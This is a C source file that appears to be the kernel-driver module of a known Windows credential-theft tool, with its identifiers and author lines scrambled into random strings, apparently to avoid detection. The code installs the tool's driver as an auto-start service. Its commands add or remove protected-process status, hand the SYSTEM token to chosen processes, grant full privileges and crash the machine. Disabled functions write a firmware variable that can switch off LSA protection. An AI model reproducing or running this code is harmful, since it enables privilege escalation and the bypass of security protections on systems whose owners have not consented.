/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlkernel.h"

const KUHL_K_C kcpd_k_c_kernel[] = {
	{kcpdclqlkernel_add_mimidrv,			0,									L"+",				L"Install and/or start miAquvwg driver (mimidrv)"},
	{kcpdclqlkernel_remove_mimidrv,		0,									L"-",				L"Remove miAquvwg driver (mimidrv)"},
	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
	{kcpdclqlkernel_processProtect,		0,									L"processProtect",	L"Protect process"},
	{kcpdclqlkernel_processToken,		0,									L"processToken",	L"Duplicate process token"},
	{kcpdclqlkernel_processPrivilege,	0,									L"processPrivilege",L"Set all privilege on process"},
	{NULL,								IOCTL_MIMIDRV_MODULE_LIST,			L"modules",			L"List modules"},
	{NULL,								IOCTL_MIMIDRV_SSDT_LIST,			L"ssdt",			L"List SSDT"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_PROCESS_LIST,	L"notifProcess",	L"List process notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_THREAD_LIST,	L"notifThread",		L"List thread notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST,	L"notifImage",		L"List image notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_REG_LIST,		L"notifReg",		L"List registry notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST,	L"notifObject",		L"List object notify callbacks"},
	{NULL,								IOCTL_MIMIDRV_FILTER_LIST,			L"filters",			L"List FS filters"},
	{NULL,								IOCTL_MIMIDRV_MINIFILTER_LIST,		L"minifilters",		L"List minifilters"},
	//{kcpdclqlkernel_sysenv_set,			0,		L"sysenvset",		L"System Environment Variable Set"},
	//{kcpdclqlkernel_sysenv_del,			0,		L"sysenvdel",		L"System Environment Variable Delete"},
};

NTSTATUS kcpdclqlkernel_do(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc);
	unsigned short indexCommand;
	BOOL commandFound = FALSE;

	if(argv && (argc > 0))
	{
		for(indexCommand = 0; !commandFound && (indexCommand < ARRAYSIZE(kcpd_k_c_kernel)); indexCommand++)
		{
			if(commandFound = _wcsicmp(argv[0], kcpd_k_c_kernel[indexCommand].command) == 0)
			{
				if(kcpd_k_c_kernel[indexCommand].pCommand)
					status = kcpd_k_c_kernel[indexCommand].pCommand(argc - 1, argv + 1);
				else
					ydeuclqlkernel_mimidrv_simple_output(kcpd_k_c_kernel[indexCommand].ioctlCode, NULL, 0);
			}
		}
		if(!commandFound)
			ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_RAW, input, (DWORD) (wcslen(input) + 1) * sizeof(wchar_t));
	}
	return status;
}

NTSTATUS kcpdclqlkernel_add_mimidrv(int argc, wchar_t * argv[])
{
	wchar_t *absFile;
	if(ydeuclqlfile_getAbsolutePathOf(AHFIEEIO_DRIVER L".sys", &absFile))
	{
		if(ydeuclqlfile_isFileExist(absFile))
			ydeuclqlservice_install(AHFIEEIO_DRIVER, AHFIEEIO L" driver (" AHFIEEIO_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
		else PRINT_ERROR_AUTO(L"ydeuclqlfile_isFileExist");
		LocalFree(absFile);
	}
	else PRINT_ERROR_AUTO(L"ydeuclqlfile_getAbsolutePathOf");
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_remove_mimidrv(int argc, wchar_t * argv[])
{
	ydeuclqlservice_uninstall(AHFIEEIO_DRIVER);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_processProtect(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_PROTECT_INFORMATION protectInfos = {0, {0, 0, {0, 0, 0}}};
	PCWCHAR szProcessName, szPid;
	BOOL isUnprotect;

	if(AHFIEEIO_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
		isUnprotect = ydeuclqlstring_args_byName(argc, argv, L"remove", NULL, NULL);
		if(ydeuclqlstring_args_byName(argc, argv, L"process", &szProcessName, NULL))
		{
			kprintf(L"Process : %s\n", szProcessName);
			if(!ydeuclqlprocess_getProcessIdForName(szProcessName, &protectInfos.processId))
				PRINT_ERROR_AUTO(L"ydeuclqlprocess_getProcessIdForName");
		}
		else if(ydeuclqlstring_args_byName(argc, argv, L"pid", &szPid, NULL))
		{
			protectInfos.processId = wcstoul(szPid, NULL, 0);
		}
		else PRINT_ERROR(L"Argument /process:program.exe or /pid:processid needed\n");

		if(protectInfos.processId)
		{
			if(!isUnprotect)
			{
				if(AHFIEEIO_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
				{
					protectInfos.SignatureProtection.SignatureLevel = 1;
				}
				else if(AHFIEEIO_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x0f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
				}
				else
				{
					protectInfos.SignatureProtection.SignatureLevel = 0x3f;
					protectInfos.SignatureProtection.SectionSignatureLevel = 0x3f;

					protectInfos.SignatureProtection.Protection.Type = 2;
					protectInfos.SignatureProtection.Protection.Audit = 0;
					protectInfos.SignatureProtection.Protection.Signer = 6;
				}
			}
			kprintf(L"PID %u -> %02x/%02x [%1x-%1x-%1x]\n", protectInfos.processId, protectInfos.SignatureProtection.SignatureLevel, protectInfos.SignatureProtection.SectionSignatureLevel, protectInfos.SignatureProtection.Protection.Type, protectInfos.SignatureProtection.Protection.Audit, protectInfos.SignatureProtection.Protection.Signer);
			ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_PROTECT, &protectInfos, sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION));
		}
		else PRINT_ERROR(L"No PID\n");
	}
	else PRINT_ERROR(L"Protected process not available before Windows Vista\n");
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_processToken(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
	PCWCHAR szFrom, szTo;

	if(ydeuclqlstring_args_byName(argc, argv, L"from", &szFrom, NULL))
		tokenInfo.fromProcessId = wcstoul(szFrom, NULL, 0);

	if(ydeuclqlstring_args_byName(argc, argv, L"to", &szTo, NULL))
		tokenInfo.toProcessId = wcstoul(szTo, NULL, 0);

	kprintf(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
	if(!tokenInfo.fromProcessId)
		kprintf(L" * from 0 will take SYSTEM token\n");
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'miAquvwg\' process\n");

	ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_processPrivilege(int argc, wchar_t * argv[])
{
	PCWCHAR szPid;
	ULONG pid = 0;

	if(ydeuclqlstring_args_byName(argc, argv, L"pid", &szPid, NULL))
		pid = wcstoul(szPid, NULL, 0);
	
	ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_FULLPRIV, pid ? &pid : NULL, pid ? sizeof(ULONG) : 0);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_sysenv_set(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	LPCWSTR szName, szGuid, szAttributes, szData;
	UNICODE_STRING uName, uGuid;
	GUID guid;
	LPBYTE hex = NULL;
	DWORD size, attributes, nameLen, structSize;
	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;

	ydeuclqlstring_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
	ydeuclqlstring_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
	ydeuclqlstring_args_byName(argc, argv, L"attributes", &szAttributes, L"1");
	ydeuclqlstring_args_byName(argc, argv, L"data", &szData, L"00000000");

	RtlInitUnicodeString(&uName, szName);
	RtlInitUnicodeString(&uGuid, szGuid);
	attributes = wcstoul(szAttributes, NULL, 0);

	status = RtlGUIDFromString(&uGuid, &guid);
	if(NT_SUCCESS(status))
	{
		kprintf(L"Name       : %wZ\nVendor GUID: ", &uName);
		//kcpdclqlsysenv_display_vendorGuid(&guid);
		kprintf(L"\nAttributes : %08x (", attributes);
		//kcpdclqlsysenv_display_attributes(attributes);
		kprintf(L")\n");
		if(ydeuclqlstring_stringToHexBuffer(szData, &hex, &size))
		{
			kprintf(L"Length     : %u\nData       : ", size);
			ydeuclqlstring_wprintf_hex(hex, size, 1);
			kprintf(L"\n\n");
			nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
			structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen  + size;
			if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
			{
				vnv->Attributes = attributes;
				RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
				vnv->ValueLength = size;
				vnv->ValueOffset = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
				RtlCopyMemory(vnv->Name, szName, nameLen);
				RtlCopyMemory((PBYTE) vnv + vnv->ValueOffset, hex, size);
				if(ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
					kprintf(L"> OK!\n");
				LocalFree(vnv);
			}
			LocalFree(hex);
		}
	}
	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlkernel_sysenv_del(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	LPCWSTR szName, szGuid, szAttributes;
	UNICODE_STRING uName, uGuid;
	GUID guid;
	DWORD attributes, nameLen, structSize;
	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;

	ydeuclqlstring_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
	ydeuclqlstring_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
	ydeuclqlstring_args_byName(argc, argv, L"attributes", &szAttributes, L"1");

	RtlInitUnicodeString(&uName, szName);
	RtlInitUnicodeString(&uGuid, szGuid);
	attributes = wcstoul(szAttributes, NULL, 0);

	status = RtlGUIDFromString(&uGuid, &guid);
	if(NT_SUCCESS(status))
	{
		kprintf(L"Name       : %wZ\nVendor GUID: ", &uName);
		//kcpdclqlsysenv_display_vendorGuid(&guid);
		kprintf(L"\nAttributes : %08x (", attributes);
		//kcpdclqlsysenv_display_attributes(attributes);
		kprintf(L")\n\n");

		nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
		structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
		if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
		{
			vnv->Attributes = attributes;
			RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
			vnv->ValueLength = 0;
			vnv->ValueOffset = 0;
			RtlCopyMemory(vnv->Name, szName, nameLen);
			if(ydeuclqlkernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
				kprintf(L"> OK!\n");
			LocalFree(vnv);
		}
	}
	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
	return STATUS_SUCCESS;
}